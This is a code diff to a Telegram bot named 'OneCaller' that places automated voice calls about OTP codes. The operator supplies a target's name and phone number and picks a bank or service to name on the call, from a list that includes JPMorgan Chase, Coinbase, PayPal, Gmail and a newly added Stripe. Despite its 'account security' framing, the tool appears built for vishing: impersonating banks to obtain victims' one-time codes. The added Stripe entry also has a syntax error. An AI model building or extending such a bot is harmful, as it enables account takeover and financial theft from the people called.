@@ -63,9 +63,9 @@ active_calls = {}
 # Bank and Service options
 BANK_OPTIONS = [
     "JPMorgan Chase", "Citibank", "Goldman Sachs", "TD Bank", "Citizens Bank",
-    "Morgan Stanley", "KeyBank", "Bank of America Financial", "U.S. Bank Branch", "Truist",
-    "BMO Harris Bank", "Fifth Third Bank", "Huntington Bank", "Ally Bank", "Wells Fargo Bank",
-    "PNC Bank", "Capital One Bank", "First Citizens Bank", "M&T Bank", "American Express", "Paypal", "Coinbase"
+    "Morgan Stanley", "KeyBank", "Bank of America", "U.S. Bank", "Truist",
+    "BMO Harris", "Fifth Third Bank", "Huntington", "Ally Bank", "Wells Fargo",
+    "PNC Bank", "Capital One", "First Citizens", "M&T Bank", "American Express", "Paypal", "Coinbase"
 ]
 
 SERVICE_OPTIONS = [
@@ -75,11 +75,12 @@ SERVICE_OPTIONS = [
     ("📱 Google Pay", "googlepay"),
     ("📧 Gmail", "gmail"),
     ("✉️ Yahoo Mail", "yahoomail"),
-    ("📫 Outlook Mail", "outlookmail")
+    ("📫 Outlook Mail", "outlookmail"),
+    ("💳 Stripe, "stripe")
 ]
 
 BANKS_PER_PAGE = 8
-SERVICES_PER_PAGE = 7
+SERVICES_PER_PAGE = 4
 
 def create_inline_keyboard():
     """Create inline keyboard for main menu."""
@@ -141,7 +142,7 @@ def create_verification_type_keyboard():
 def send_welcome(message):
     """Handle /start command."""
     welcome_text = (
-        "🎯 Welcome to *One Caller*!\n\n"
+        "🎯 Welcome to *OneCaller*!\n\n"
         "I can help you verify phone numbers through voice calls.\n\n"
         "🏦 This service is designed to enhance account security by delivering OTP codes via a secure voice call\n\n"
         "📱 Features:\n"
@@ -194,14 +195,12 @@ def handle_callback_query(call):
     elif call.data == "help":
         bot.answer_callback_query(call.id)
         help_text = (
-            "📌 *One Caller Guide*\n\n"
+            "📌 *OneCaller Guide*\n\n"
             "1️⃣ Click 'Start Call'\n"
             "2️⃣ Enter recipient's name\n"
             "3️⃣ Choose to verify a bank or service\n"
             "4️⃣ Select the specific bank or service\n"
             "5️⃣ Enter phone number with country code\n"
-            "6️⃣ Wait for the voice call\n"
-            "7️⃣ Enter the code when prompted\n\n"
             "📞 *Call Status Icons:*\n"
             "🔔 Ringing\n"
             "📞 In Progress\n"
@@ -209,7 +208,6 @@ def handle_callback_query(call):
             "❌ Failed\n"
             "⏰ Busy\n"
             "📵 No Answer\n\n"
-            "Need help? Contact @YourSupportHandle"
         )
         bot.send_message(chat_id, help_text, parse_mode="Markdown")
     
